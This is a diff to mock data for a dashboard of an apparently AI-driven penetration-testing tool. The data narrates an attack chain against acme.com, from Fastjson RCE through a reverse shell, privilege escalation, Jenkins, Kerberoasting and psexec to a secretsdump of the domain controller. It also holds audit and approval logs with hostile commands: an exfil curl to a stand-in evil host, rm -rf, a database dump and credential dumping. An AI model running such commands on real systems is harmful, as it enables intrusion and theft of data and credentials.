     summary: "shop.acme.com is a self-developed e-commerce company. It first fingerprints the framework/component version, and then starts with components with known deserialization.",
   },
@@ -2128,7 +2153,7 @@ export const activity: Activity[] = [
     seq: 321,
     worker: "work#6",
     intent_id: "i6",
-    ts: T("2026-07-25T14:24:00Z"),
+    ts: T("2026-09-29T19:33:53Z"),
     kind: "tool_use",
     tool: "bash",
     tool_use_id: "t6a",
@@ -2138,7 +2163,7 @@ export const activity: Activity[] = [
     seq: 322,
     worker: "work#6",
     intent_id: "i6",
-    ts: T("2026-07-25T14:24:03Z"),
+    ts: T("2026-09-29T19:33:54Z"),
     kind: "tool_result",
     tool: "bash",
     tool_use_id: "t6a",
@@ -2149,7 +2174,7 @@ export const activity: Activity[] = [
     seq: 323,
     worker: "work#6",
     intent_id: "i6",
-    ts: T("2026-07-25T14:30:00Z"),
+    ts: T("2026-09-29T19:36:44Z"),
     kind: "tool_use",
     tool: "bash",
     tool_use_id: "t6b",
@@ -2160,7 +2185,7 @@ export const activity: Activity[] = [
     seq: 324,
     worker: "work#6",
     intent_id: "i6",
-    ts: T("2026-07-25T14:31:00Z"),
+    ts: T("2026-09-29T19:37:13Z"),
     kind: "tool_result",
     tool: "bash",
     tool_use_id: "t6b",
@@ -2171,7 +2196,7 @@ export const activity: Activity[] = [
     seq: 325,
     worker: "work#6",
     intent_id: "i6",
-    ts: T("2026-07-25T14:40:00Z"),
+    ts: T("2026-09-29T19:41:30Z"),
     kind: "result",
     summary: "The fingerprint hits Fastjson 1.2.24, the deserialization RCE face is established and handed over to the intended use.",
     input_tokens: 64000,
@@ -2185,7 +2210,7 @@ export const activity: Activity[] = [
     seq: 330,
     worker: "work#7",
     intent_id: "i7",
-    ts: T("2026-07-25T15:12:00Z"),
+    ts: T("2026-09-29T19:56:45Z"),
     kind: "thinking",
     summary: "Create a JNDI/LDAP malicious service, let shop reversely load and execute the payload, first use dnslog to verify the network access, and then drop the rebound shell.",
   },
@@ -2193,7 +2218,7 @@ export const activity: Activity[] = [
     seq: 331,
     worker: "work#7",
     intent_id: "i7",
-    ts: T("2026-07-25T15:15:00Z"),
+    ts: T("2026-09-29T19:58:11Z"),
     kind: "tool_use",
     tool: "bash",
     tool_use_id: "t7a",
@@ -2203,7 +2228,7 @@ export const activity: Activity[] = [
     seq: 332,
     worker: "work#7",
     intent_id: "i7",
-    ts: T("2026-07-25T15:16:00Z"),
+    ts: T("2026-09-29T19:58:39Z"),
     kind: "tool_result",
     tool: "bash",
     tool_use_id: "t7a",
@@ -2214,7 +2239,7 @@ export const activity: Activity[] = [
     seq: 333,
     worker: "work#7",
     intent_id: "i7",
-    ts: T("2026-07-25T15:20:00Z"),
+    ts: T("2026-09-29T20:00:34Z"),
     kind: "tool_use",
     tool: "bash",
     tool_use_id: "t7b",
@@ -2225,7 +2250,7 @@ export const activity: Activity[] = [
     seq: 334,
     worker: "work#7",
     intent_id: "i7",
-    ts: T("2026-07-25T15:21:00Z"),
+    ts: T("2026-09-29T20:01:02Z"),
     kind: "tool_result",
     tool: "bash",
     tool_use_id: "t7b",
@@ -2236,7 +2261,7 @@ export const activity: Activity[] = [
     seq: 335,
     worker: "work#7",
     intent_id: "i7",
-    ts: T("2026-07-25T15:24:00Z"),
+    ts: T("2026-09-29T20:02:28Z"),
     kind: "tool_use",
     tool: "bash",
     tool_use_id: "t7c",
@@ -2246,7 +2271,7 @@ export const activity: Activity[] = [
     seq: 336,
     worker: "work#7",
     intent_id: "i7",
-    ts: T("2026-07-25T15:24:02Z"),
+    ts: T("2026-09-29T20:02:29Z"),
     kind: "tool_result",
     tool: "bash",
     tool_use_id: "t7c",
@@ -2257,7 +2282,7 @@ export const activity: Activity[] = [
     seq: 337,
     worker: "work#7",
     intent_id: "i7",
-    ts: T("2026-07-25T15:30:00Z"),
+    ts: T("2026-09-29T20:05:20Z"),
     kind: "tool_use",
     tool: "report_finding",
     tool_use_id: "t7d",
@@ -2267,7 +2292,7 @@ export const activity: Activity[] = [
     seq: 338,
     worker: "work#7",
     intent_id: "i7",
-    ts: T("2026-07-25T15:40:00Z"),
+    ts: T("2026-09-29T20:10:05Z"),
     kind: "result",
     summary: "Deserialize RCE and get the www-data rebound shell, and the foothold for goal ③ is initially established.",
     input_tokens: 132000,
@@ -2281,7 +2306,7 @@ export const activity: Activity[] = [
     seq: 340,
     worker: "work#8",
     intent_id: "i8",
-    ts: T("2026-07-25T16:02:00Z"),
+    ts: T("2026-09-29T20:20:34Z"),
     kind: "thinking",
     summary: "www-data has limited permissions. First collect local information to find the right escalation points: sudo configuration, SUID, and kernel version.",
   },
@@ -2289,7 +2314,7 @@ export const activity: Activity[] = [
     seq: 341,
     worker: "work#8",
     intent_id: "i8",
-    ts: T("2026-07-25T16:05:00Z"),
+    ts: T("2026-09-29T20:22:00Z"),
     kind: "tool_use",
     tool: "bash",
     tool_use_id: "t8a",
@@ -2299,7 +2324,7 @@ export const activity: Activity[] = [
     seq: 342,
     worker: "work#8",
     intent_id: "i8",
-    ts: T("2026-07-25T16:05:03Z"),
+    ts: T("2026-09-29T20:22:02Z"),
     kind: "tool_result",
     tool: "bash",
     tool_use_id: "t8a",
@@ -2310,7 +2335,7 @@ export const activity: Activity[] = [
     seq: 343,
     worker: "work#8",
     intent_id: "i8",
-    ts: T("2026-07-25T16:10:00Z"),
+    ts: T("2026-09-29T20:24:23Z"),
     kind: "tool_use",
     tool: "bash",
     tool_use_id: "t8b",
@@ -2320,7 +2345,7 @@ export const activity: Activity[] = [
     seq: 344,
     worker: "work#8",
     intent_id: "i8",
-    ts: T("2026-07-25T16:10:02Z"),
+    ts: T("2026-09-29T20:24:24Z"),
     kind: "tool_result",
     tool: "bash",
     tool_use_id: "t8b",
@@ -2331,7 +2356,7 @@ export const activity: Activity[] = [
     seq: 345,
     worker: "work#8",
     intent_id: "i8",
-    ts: T("2026-07-25T16:14:00Z"),
+    ts: T("2026-09-29T20:26:17Z"),
     kind: "tool_use",
     tool: "report_finding",
     tool_use_id: "t8c",
@@ -2341,7 +2366,7 @@ export const activity: Activity[] = [
     seq: 346,
     worker: "work#8",
     intent_id: "i8",
-    ts: T("2026-07-25T16:20:00Z"),
+    ts: T("2026-09-29T20:29:09Z"),
     kind: "result",
     summary: "The local root privilege escalation is completed, and the foothold is stable; prepare to use it to build an intranet for the pivot.",
     input_tokens: 74000,
@@ -2355,7 +2380,7 @@ export const activity: Activity[] = [
     seq: 350,
     worker: "work#9",
     intent_id: "i9",
-    ts: T("2026-07-25T20:32:00Z"),
+    ts: T("2026-09-29T22:29:13Z"),
     kind: "thinking",
     summary: "Directly connect to 10.10.10.0/24, use fscan/intranet scanning to discover hosts and ports, and identify domain controllers and high-value hosts.",
   },
@@ -2363,7 +2388,7 @@ export const activity: Activity[] = [
     seq: 351,
     worker: "work#9",
     intent_id: "i9",
-    ts: T("2026-07-25T20:36:00Z"),
+    ts: T("2026-09-29T22:31:07Z"),
     kind: "tool_use",
     tool: "bash",
     tool_use_id: "t9a",
@@ -2373,7 +2398,7 @@ export const activity: Activity[] = [
     seq: 352,
     worker: "work#9",
     intent_id: "i9",
-    ts: T("2026-07-25T20:55:00Z"),
+    ts: T("2026-09-29T22:40:11Z"),
     kind: "tool_result",
     tool: "bash",
     tool_use_id: "t9a",
@@ -2384,7 +2409,7 @@ export const activity: Activity[] = [
     seq: 353,
     worker: "work#9",
     intent_id: "i9",
-    ts: T("2026-07-25T21:00:00Z"),
+    ts: T("2026-09-29T22:42:34Z"),
     kind: "result",
     summary: "Intranet host discovery is completed, and 3 high-value targets are included in the map.",
     input_tokens: 82000,
@@ -2398,7 +2423,7 @@ export const activity: Activity[] = [
     seq: 360,
     worker: "work#10",
     intent_id: "i10",
-    ts: T("2026-07-26T03:42:00Z"),
+    ts: T("2026-09-30T01:54:06Z"),
     kind: "thinking",
     summary: "The source code leaked sa/Acme@2021 is the DB password, which is a common password reuse in enterprises. Do password spraying on DC01/FS01/JENKINS.",
   },
@@ -2406,7 +2431,7 @@ export const activity: Activity[] = [
     seq: 361,
     worker: "work#10",
     intent_id: "i10",
-    ts: T("2026-07-26T03:44:00Z"),
+    ts: T("2026-09-30T01:55:03Z"),
     kind: "tool_use",
     tool: "bash",
     tool_use_id: "t10a",
@@ -2416,7 +2441,7 @@ export const activity: Activity[] = [
     seq: 362,
     worker: "work#10",
     intent_id: "i10",
-    ts: T("2026-07-26T03:44:10Z"),
+    ts: T("2026-09-30T01:55:08Z"),
     kind: "tool_result",
     tool: "bash",
     tool_use_id: "t10a",
@@ -2427,7 +2452,7 @@ export const activity: Activity[] = [
     seq: 363,
     worker: "work#10",
     intent_id: "i10",
-    ts: T("2026-07-26T03:50:00Z"),
+    ts: T("2026-09-30T01:57:54Z"),
     kind: "thinking",
     summary: "FS01 has been captured, enumerating shared directories looking for more credentials and sensitive files...",
   },
@@ -2437,7 +2462,7 @@ export const activity: Activity[] = [
     seq: 370,
     worker: "work#11",
     intent_id: "i11",
-    ts: T("2026-07-25T21:32:00Z"),
+    ts: T("2026-09-29T22:57:48Z"),
     kind: "thinking",
     summary: "JENKINS 8080 is directly accessible, first check whether the /script console requires authentication.",
   },
@@ -2445,7 +2470,7 @@ export const activity: Activity[] = [
     seq: 371,
     worker: "work#11",
     intent_id: "i11",
-    ts: T("2026-07-25T21:35:00Z"),
+    ts: T("2026-09-29T22:59:14Z"),
     kind: "tool_use",
     tool: "bash",
     tool_use_id: "t11a",
@@ -2455,7 +2480,7 @@ export const activity: Activity[] = [
     seq: 372,
     worker: "work#11",
     intent_id: "i11",
-    ts: T("2026-07-25T21:35:02Z"),
+    ts: T("2026-09-29T22:59:15Z"),
     kind: "tool_result",
     tool: "bash",
     tool_use_id: "t11a",
@@ -2466,7 +2491,7 @@ export const activity: Activity[] = [
     seq: 373,
     worker: "work#11",
     intent_id: "i11",
-    ts: T("2026-07-25T21:40:00Z"),
+    ts: T("2026-09-29T23:01:37Z"),
     kind: "tool_use",
     tool: "bash",
     tool_use_id: "t11b",
@@ -2476,7 +2501,7 @@ export const activity: Activity[] = [
     seq: 374,
     worker: "work#11",
     intent_id: "i11",
-    ts: T("2026-07-25T21:40:03Z"),
+    ts: T("2026-09-29T23:01:38Z"),
     kind: "tool_result",
     tool: "bash",
     tool_use_id: "t11b",
@@ -2487,7 +2512,7 @@ export const activity: Activity[] = [
     seq: 375,
     worker: "work#11",
     intent_id: "i11",
-    ts: T("2026-07-25T21:44:00Z"),
+    ts: T("2026-09-29T23:03:31Z"),
     kind: "tool_use",
     tool: "bash",
     tool_use_id: "t11c",
@@ -2497,7 +2522,7 @@ export const activity: Activity[] = [
     seq: 376,
     worker: "work#11",
     intent_id: "i11",
-    ts: T("2026-07-25T21:45:00Z"),
+    ts: T("2026-09-29T23:04:00Z"),
     kind: "tool_result",
     tool: "bash",
     tool_use_id: "t11c",
@@ -2508,7 +2533,7 @@ export const activity: Activity[] = [
     seq: 377,
     worker: "work#11",
     intent_id: "i11",
-    ts: T("2026-07-25T21:48:00Z"),
+    ts: T("2026-09-29T23:05:26Z"),
     kind: "tool_use",
     tool: "report_finding",
     tool_use_id: "t11d",
@@ -2518,7 +2543,7 @@ export const activity: Activity[] = [
     seq: 378,
     worker: "work#11",
     intent_id: "i11",
-    ts: T("2026-07-25T21:50:00Z"),
+    ts: T("2026-09-29T23:06:23Z"),
     kind: "result",
     summary: "Jenkins is not authorized to confirm RCE and export the credentials of two domain service accounts.",
     input_tokens: 96000,
@@ -2532,7 +2557,7 @@ export const activity: Activity[] = [
     seq: 380,
     worker: "work#12",
     intent_id: "i12",
-    ts: T("2026-07-25T22:42:00Z"),
+    ts: T("2026-09-29T23:31:09Z"),
     kind: "thinking",
     summary: "Use svc_deploy credentials for domain authentication, then GetUserSPNs requests the Kerberoast-enabled service account TGS.",
   },
@@ -2540,7 +2565,7 @@ export const activity: Activity[] = [
     seq: 381,
     worker: "work#12",
     intent_id: "i12",
-    ts: T("2026-07-25T22:50:00Z"),
+    ts: T("2026-09-29T23:34:58Z"),
     kind: "tool_use",
     tool: "bash",
     tool_use_id: "t12a",
@@ -2550,7 +2575,7 @@ export const activity: Activity[] = [
     seq: 382,
     worker: "work#12",
     intent_id: "i12",
-    ts: T("2026-07-25T22:52:00Z"),
+    ts: T("2026-09-29T23:35:55Z"),
     kind: "tool_result",
     tool: "bash",
     tool_use_id: "t12a",
@@ -2561,7 +2586,7 @@ export const activity: Activity[] = [
     seq: 383,
     worker: "work#12",
     intent_id: "i12",
-    ts: T("2026-07-25T23:10:00Z"),
+    ts: T("2026-09-29T23:44:30Z"),
     kind: "tool_use",
     tool: "bash",
     tool_use_id: "t12b",
@@ -2571,7 +2596,7 @@ export const activity: Activity[] = [
     seq: 384,
     worker: "work#12",
     intent_id: "i12",
-    ts: T("2026-07-25T23:18:00Z"),
+    ts: T("2026-09-29T23:48:19Z"),
     kind: "tool_result",
     tool: "bash",
     tool_use_id: "t12b",
@@ -2582,7 +2607,7 @@ export const activity: Activity[] = [
     seq: 385,
     worker: "work#12",
     intent_id: "i12",
-    ts: T("2026-07-25T23:19:00Z"),
+    ts: T("2026-09-29T23:48:47Z"),
     kind: "tool_use",
     tool: "report_finding",
     tool_use_id: "t12c",
@@ -2592,7 +2617,7 @@ export const activity: Activity[] = [
     seq: 386,
     worker: "work#12",
     intent_id: "i12",
-    ts: T("2026-07-25T23:20:00Z"),
+    ts: T("2026-09-29T23:49:16Z"),
     kind: "result",
     summary: "Kerberoasting breaks out the svc_sql password and enters it into the image for use in domain control attacks.",
     input_tokens: 108000,
@@ -2606,7 +2631,7 @@ export const activity: Activity[] = [
     seq: 390,
     worker: "work#13",
     intent_id: "i13",
-    ts: T("2026-07-25T23:52:00Z"),
+    ts: T("2026-09-30T00:04:31Z"),
     kind: "thinking",
     summary: "svc_deploy comes from the Jenkins credential database. First check the group membership - if it belongs to Domain Admins, you can psexec DC01 directly.",
   },
@@ -2614,7 +2639,7 @@ export const activity: Activity[] = [
     seq: 391,
     worker: "work#13",
     intent_id: "i13",
-    ts: T("2026-07-25T23:55:00Z"),
+    ts: T("2026-09-30T00:05:56Z"),
     kind: "tool_use",
     tool: "bash",
     tool_use_id: "t13a",
@@ -2624,7 +2649,7 @@ export const activity: Activity[] = [
     seq: 392,
     worker: "work#13",
     intent_id: "i13",
-    ts: T("2026-07-25T23:55:05Z"),
+    ts: T("2026-09-30T00:05:59Z"),
     kind: "tool_result",
     tool: "bash",
     tool_use_id: "t13a",
@@ -2635,7 +2660,7 @@ export const activity: Activity[] = [
     seq: 393,
     worker: "work#13",
     intent_id: "i13",
-    ts: T("2026-07-26T00:00:00Z"),
+    ts: T("2026-09-30T00:08:19Z"),
     kind: "tool_use",
     tool: "bash",
     tool_use_id: "t13b",
@@ -2645,7 +2670,7 @@ export const activity: Activity[] = [
     seq: 394,
     worker: "work#13",
     intent_id: "i13",
-    ts: T("2026-07-26T00:00:10Z"),
+    ts: T("2026-09-30T00:08:24Z"),
     kind: "tool_result",
     tool: "bash",
     tool_use_id: "t13b",
@@ -2656,7 +2681,7 @@ export const activity: Activity[] = [
     seq: 395,
     worker: "work#13",
     intent_id: "i13",
-    ts: T("2026-07-26T00:05:00Z"),
+    ts: T("2026-09-30T00:10:42Z"),
     kind: "tool_use",
     tool: "bash",
     tool_use_id: "t13c",
@@ -2666,7 +2691,7 @@ export const activity: Activity[] = [
     seq: 396,
     worker: "work#13",
     intent_id: "i13",
-    ts: T("2026-07-26T00:10:00Z"),
+    ts: T("2026-09-30T00:13:05Z"),
     kind: "tool_result",
     tool: "bash",
     tool_use_id: "t13c",
@@ -2677,7 +2702,7 @@ export const activity: Activity[] = [
     seq: 397,
     worker: "work#13",
     intent_id: "i13",
-    ts: T("2026-07-26T00:15:00Z"),
+    ts: T("2026-09-30T00:15:28Z"),
     kind: "tool_use",
     tool: "report_finding",
     tool_use_id: "t13d",
@@ -2687,7 +2712,7 @@ export const activity: Activity[] = [
     seq: 398,
     worker: "work#13",
     intent_id: "i13",
-    ts: T("2026-07-26T00:20:00Z"),
+    ts: T("2026-09-30T00:17:51Z"),
     kind: "result",
     summary: "Domain controller DC01 is captured, secretsdump exports the global hash, and the target is achieved.",
     input_tokens: 144000,
@@ -2697,20 +2722,20 @@ export const activity: Activity[] = [
   },
 
   // Lord agent(People talking in the loop)
-  { seq: 70, worker: "mainagent", ts: T("2026-07-26T03:18:00Z"), kind: "user", summary: "Where to start in the background?" },
+  { seq: 70, worker: "mainagent", ts: T("2026-09-30T01:42:40Z"), kind: "user", summary: "Where to start in the background?" },
   {
     seq: 71,
     worker: "mainagent",
-    ts: T("2026-07-26T03:18:06Z"),
+    ts: T("2026-09-30T01:42:42Z"),
     kind: "text",
     summary:
       "admin.acme.com is the Element-UI backend with no verification code and no rate limit. It is recommended to default the password table (admin/admin123) first and then add the dictionary. I have injected a high quality intent into the work agent.",
   },
-  { seq: 72, worker: "mainagent", ts: T("2026-07-26T03:52:00Z"), kind: "user", summary: "Now that we have the background, what's the next point?" },
+  { seq: 72, worker: "mainagent", ts: T("2026-09-30T01:58:52Z"), kind: "user", summary: "Now that we have the background, what's the next point?" },
   {
     seq: 73,
     worker: "mainagent",
-    ts: T("2026-07-26T03:52:08Z"),
+    ts: T("2026-09-30T01:58:55Z"),
     kind: "text",
     summary:
       "Goal ② is to read user sensitive data: promote \"Backend User Interface Enumeration\" and \"API IDOR\" in parallel. Note that batch export will trigger interception rules and require your approval.",
@@ -2718,14 +2743,14 @@ export const activity: Activity[] = [
   {
     seq: 400,
     worker: "mainagent",
-    ts: T("2026-07-25T15:42:00Z"),
+    ts: T("2026-09-29T20:11:03Z"),
     kind: "user",
     summary: "I got the shell, what's the next step?",
   },
   {
     seq: 401,
     worker: "mainagent",
-    ts: T("2026-07-25T15:42:10Z"),
+    ts: T("2026-09-29T20:11:07Z"),
     kind: "text",
     summary:
       "www-data does not have enough permissions. Elevate the permissions first (sudo -l seems to work). After getting root, use DMZ as a springboard to discover the intranet, giving priority to domain controllers and Jenkins.",
@@ -2733,23 +2758,23 @@ export const activity: Activity[] = [
   {
     seq: 402,
     worker: "mainagent",
-    ts: T("2026-07-25T21:22:00Z"),
+    ts: T("2026-09-29T22:53:02Z"),
     kind: "user",
     summary: "After scanning the intranet, does the Jenkins server look unauthorized?",
   },
   {
     seq: 403,
     worker: "mainagent",
-    ts: T("2026-07-25T21:22:08Z"),
+    ts: T("2026-09-29T22:53:06Z"),
     kind: "text",
     summary:
       "Yes, /script goes directly to Groovy RCE without authentication. I have injected a prompt to let the worker first run Jenkins - after taking it, you can export the domain credentials, and then use Kerberoasting to run domain control.",
   },
-  { seq: 404, worker: "mainagent", ts: T("2026-07-26T00:22:00Z"), kind: "user", summary: "DC01 won? Give a summary." },
+  { seq: 404, worker: "mainagent", ts: T("2026-09-30T00:18:48Z"), kind: "user", summary: "DC01 won? Give a summary." },
   {
     seq: 405,
     worker: "mainagent",
-    ts: T("2026-07-26T00:22:12Z"),
+    ts: T("2026-09-30T00:18:54Z"),
     kind: "text",
     summary:
       "Confirm to win. Attack path: shop Fastjson RCE → DMZ privilege escalation → intranet Jenkins export domain credentials → svc_deploy belongs to Domain Admins → psexec DC01 SYSTEM → secretsdump global hash. All four goals have been achieved or are in progress.",
@@ -2830,9 +2855,12 @@ export const tokenSessions: SessionTokenUsage[] = (() => {
 
 export const tokenTotal: TokenTotal = grandTotal;
 
-export const dailyTokens: DailyTokenBucket[] = Array.from({ length: 30 }, (_, i) => {
-  const d = new Date("2026-07-26T00:00:00Z");
-  d.setUTCDate(d.getUTCDate() - (29 - i));
+// 400 days ending today so every dashboard range has bars. Task token objects
+// are the ledger; this series only supplies the daily shape.
+export const dailyTokens: DailyTokenBucket[] = Array.from({ length: 400 }, (_, i) => {
+  const d = new Date();
+  d.setUTCHours(0, 0, 0, 0);
+  d.setUTCDate(d.getUTCDate() - (399 - i));
   const wave = 40000 + Math.round(30000 * Math.abs(Math.sin(i / 3)));
   return {
     date: d.toISOString().slice(0, 10),
@@ -2846,7 +2874,7 @@ export const dailyTokens: DailyTokenBucket[] = Array.from({ length: 30 }, (_, i)
 export const convTokens: ConvTokenSummary[] = [
   {
     llm_profile_id: 1,
-    created_at: T("2026-07-25T10:00:00Z"),
+    created_at: T("2026-09-29T17:28:06Z"),
     input_tokens: 42000,
     output_tokens: 3800,
     cache_read_tokens: 26000,
@@ -2854,7 +2882,7 @@ export const convTokens: ConvTokenSummary[] = [
   },
   {
     llm_profile_id: 2,
-    created_at: T("2026-07-24T16:00:00Z"),
+    created_at: T("2026-09-29T08:53:31Z"),
     input_tokens: 18000,
     output_tokens: 1600,
     cache_read_tokens: 9000,
@@ -2917,7 +2945,7 @@ User-Agent: ARTEX-worker/1.0
 Accept: application/json
 
 `,
-  resp: `HTTP/1.1 200 OK\nContent-Type: application/json\nContent-Length: 655\n\n{\n  "order_id": 1002,\n  "user_id": 77,\n  "amount": 1299.00,\n  "address": "Redacted example address",\n  "phone": "138****6021",\n  "items": [{ "sku": "A-100", "qty": 1 }]\n}`,
+  resp: `HTTP/1.1 200 OK\nContent-Type: application/json\nContent-Length: 655\n\n{\n  "order_id": 1002,\n  "user_id": 77,\n  "amount": 1299.00,\n  "address": "Redacted example address",\n  "phone": "555-0100",\n  "items": [{ "sku": "A-100", "qty": 1 }]\n}`,
 };
 
 // ── Security / Audit ─────────────────────────────────────────────────────────
@@ -2925,71 +2953,71 @@ export const audit: Audit = {
   attributions: { allow: 312, block: 9 },
   entries: [
     {
-      ts: T("2026-07-26T03:33:00Z"),
+      ts: T("2026-09-30T01:49:48Z"),
       tool: "bash",
       action: "allow",
       command: "curl -s -d 'username=admin...' https://admin.acme.com/login",
     },
     {
-      ts: T("2026-07-26T03:57:00Z"),
+      ts: T("2026-09-30T02:01:15Z"),
       tool: "bash",
       action: "allow",
       command: "curl -s -b 'session=...' https://admin.acme.com/api/users",
     },
     {
-      ts: T("2026-07-26T02:10:00Z"),
+      ts: T("2026-09-30T01:10:16Z"),
       tool: "bash",
       action: "block",
       reason: "Target out of bounds: out.evil.example is not within scope",
       command: "curl https://out.evil.example/exfil",
     },
     {
-      ts: T("2026-07-25T22:03:00Z"),
+      ts: T("2026-09-29T23:12:35Z"),
       tool: "bash",
       action: "allow",
       command: "sqlmap -u 'https://www.acme.com/search?q=1' --batch",
     },
     {
-      ts: T("2026-07-25T21:00:00Z"),
+      ts: T("2026-09-29T22:42:34Z"),
       tool: "bash",
       action: "block",
       reason: "Destructive command gating: rm -rf denied",
       command: "rm -rf /var/www",
     },
     {
-      ts: T("2026-07-25T20:30:00Z"),
+      ts: T("2026-09-29T22:28:16Z"),
       tool: "bash",
       action: "allow",
       command: "git-dumper https://www.acme.com/.git/ /tmp/acme",
     },
     {
-      ts: T("2026-07-25T15:20:00Z"),
+      ts: T("2026-09-29T20:00:34Z"),
       tool: "bash",
       action: "allow",
       command:
         "curl -s -H 'Content-Type: application/json' -d '{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\"...}' https://shop.acme.com/api/import",
     },
     {
-      ts: T("2026-07-25T21:40:00Z"),
+      ts: T("2026-09-29T23:01:37Z"),
       tool: "bash",
       action: "allow",
       command: "curl -s -d 'script=println+\"whoami\"...' http://10.10.10.20:8080/scriptText",
     },
     {
-      ts: T("2026-07-26T00:00:00Z"),
+      ts: T("2026-09-30T00:08:19Z"),
       tool: "bash",
       action: "allow",
       command: "impacket-psexec acme.local/svc_deploy@10.10.10.10",
     },
     {
-      ts: T("2026-07-26T00:05:00Z"),
+      ts: T("2026-09-30T00:10:42Z"),
       tool: "bash",
       action: "block",
       reason: "Data leakage gate control: secretsdump requires manual approval",
       command: "impacket-secretsdump acme.local/svc_deploy@10.10.10.10 -just-dc",
     },
     {
-      ts: T("2026-07-26T00:06:00Z"),
+      ts: T("2026-09-30T00:11:11Z"),
       tool: "bash",
       action: "allow",
       command: "impacket-secretsdump acme.local/svc_deploy@10.10.10.10 -just-dc # Approved and released",
@@ -3145,8 +3173,8 @@ const promptVars: PromptVar[] = [
 ];
 
 const promptVersions: PromptVersion[] = [
-  { version: 3, ts: T("2026-07-25T10:00:00Z"), note: "Strengthening detection and guidance of unauthorized use", template_text: "You are the planner of ARTEX…" },
-  { version: 2, ts: T("2026-07-20T10:00:00Z"), note: "First version fine-tuning", template_text: "You are the planner of ARTEX (v2)…" },
+  { version: 3, ts: T("2026-09-29T17:28:06Z"), note: "Strengthening detection and guidance of unauthorized use", template_text: "You are the planner of ARTEX…" },
+  { version: 2, ts: T("2026-09-19T21:53:55Z"), note: "First version fine-tuning", template_text: "You are the planner of ARTEX (v2)…" },
 ];
 
 export function agentDetail(key: string): AgentDetail {
@@ -3215,7 +3243,7 @@ export const skills: SkillItem[] = [
     calls: 24,
     tasks: 6,
     usage_agents: ["worker", "planner"],
-    last_used: "2026-08-20T09:12:00Z",
+    last_used: "2026-10-12T02:23:55Z",
   },
   {
     name: "playwright-cli",
@@ -3225,7 +3253,7 @@ export const skills: SkillItem[] = [
     calls: 7,
     tasks: 3,
     usage_agents: ["worker"],
-    last_used: "2026-08-19T21:40:00Z",
+    last_used: "2026-10-11T20:54:12Z",
   },
   {
     name: "scopesentry",
@@ -3238,13 +3266,13 @@ export const skills: SkillItem[] = [
 ];
 
 export const skillCalls: SkillCall[] = [
-  { ts: "2026-08-20T09:12:00Z", agent_key: "worker", task_id: 42, session_id: "", args_len: 128 },
-  { ts: "2026-08-20T08:03:00Z", agent_key: "planner", task_id: 42, session_id: "", args_len: 0 },
-  { ts: "2026-08-19T17:55:00Z", agent_key: "worker", task_id: 37, session_id: "", args_len: 64 },
+  { ts: "2026-10-12T02:23:55Z", agent_key: "worker", task_id: 42, session_id: "", args_len: 128 },
+  { ts: "2026-10-12T01:51:02Z", agent_key: "planner", task_id: 42, session_id: "", args_len: 0 },
+  { ts: "2026-10-11T19:07:00Z", agent_key: "worker", task_id: 37, session_id: "", args_len: 64 },
 ];
 
 export const missingSkills: MissingSkill[] = [
-  { skill: "jwt-forge", calls: 3, agents: ["worker"], last_used: "2026-08-20T07:20:00Z" },
+  { skill: "jwt-forge", calls: 3, agents: ["worker"], last_used: "2026-10-12T01:30:33Z" },
 ];
 
 // ── Tools ────────────────────────────────────────────────────────────────────
@@ -3365,7 +3393,7 @@ export const llmPool: LLMPoolStatus = {
       trips: 1,
       cooldown_secs: 42,
       last_error: "openai: status 402: insufficient balance",
-      last_at: T("2026-07-26T00:10:00Z"),
+      last_at: T("2026-09-30T00:13:05Z"),
     },
   ],
 };
@@ -3385,8 +3413,8 @@ export const interceptRules: InterceptRule[] = [
     timeout_enabled: true,
     timeout_seconds: 120,
     timeout_action: "deny",
-    created_at: T("2026-07-20T10:00:00Z"),
-    updated_at: T("2026-07-20T10:00:00Z"),
+    created_at: T("2026-09-19T21:53:55Z"),
+    updated_at: T("2026-09-19T21:53:55Z"),
   },
   {
     id: 2,
@@ -3401,8 +3429,8 @@ export const interceptRules: InterceptRule[] = [
     timeout_enabled: false,
     timeout_seconds: 0,
     timeout_action: "deny",
-    created_at: T("2026-07-21T10:00:00Z"),
-    updated_at: T("2026-07-21T10:00:00Z"),
+    created_at: T("2026-09-20T15:53:55Z"),
+    updated_at: T("2026-09-20T15:53:55Z"),
   },
 ];
 
@@ -3416,7 +3444,7 @@ export const interceptPending: InterceptPending[] = [
     tool_input: { command: "mysqldump -h 203.0.113.10 -uroot acme_prod > /tmp/dump.sql" },
     status: "pending",
     reason: "Data leakage gate control: Export of the entire database requires manual approval",
-    created_at: T("2026-07-26T03:58:00Z"),
+    created_at: T("2026-09-30T02:01:43Z"),
   },
 ];
 
@@ -3430,8 +3458,8 @@ export const interceptHistory: InterceptApprovalRow[] = [
     tool_input: { command: "dd if=/dev/zero of=/tmp/x" },
     status: "denied",
     reason: "Destructive orders require approval",
-    created_at: T("2026-07-25T20:00:00Z"),
-    decided_at: T("2026-07-25T20:01:00Z"),
+    created_at: T("2026-09-29T22:13:58Z"),
+    decided_at: T("2026-09-29T22:14:27Z"),
     conv_title: "",
     conv_agent_key: "",
     rule_name: "Destructive orders require approval",
@@ -3444,8 +3472,8 @@ export const interceptHistory: InterceptApprovalRow[] = [
     tool_input: { command: "rm -rf /var/www/html" },
     status: "denied",
     reason: "[Model] Delete target production file (D4)",
-    created_at: T("2026-07-25T18:00:00Z"),
-    decided_at: T("2026-07-25T18:00:05Z"),
+    created_at: T("2026-09-29T21:16:48Z"),
+    decided_at: T("2026-09-29T21:16:50Z"),
     conv_title: "",
     conv_agent_key: "",
     rule_name: "",
@@ -3459,8 +3487,8 @@ export const interceptHistory: InterceptApprovalRow[] = [
     tool_input: { command: "impacket-secretsdump acme.local/svc_deploy@10.10.10.10 -just-dc" },
     status: "allowed",
     reason: "Outgoing traffic is directly rejected",
-    created_at: T("2026-07-26T00:05:00Z"),
-    decided_at: T("2026-07-26T00:06:00Z"),
+    created_at: T("2026-09-30T00:10:42Z"),
+    decided_at: T("2026-09-30T00:11:11Z"),
     conv_title: "",
     conv_agent_key: "",
     rule_name: "Outgoing traffic is directly rejected",
@@ -3473,7 +3501,7 @@ export const interceptHistory: InterceptApprovalRow[] = [
     tool_input: { command: 'mysql -e "DROP TABLE users_bak_0921"' },
     status: "pending",
     reason: "[Model] Suspected backup table, unable to determine whether to produce data",
-    created_at: T("2026-07-25T15:14:00Z"),
+    created_at: T("2026-09-29T19:57:42Z"),
     conv_title: "",
     conv_agent_key: "",
     rule_name: "",
@@ -3490,8 +3518,8 @@ interceptHistory.unshift({
   status: "allowed",
   decision_source: "model",
   reason: "[Model] Write existing inspection conclusions into local reports without modifying business data.",
-  created_at: T("2026-07-26T08:00:00Z"),
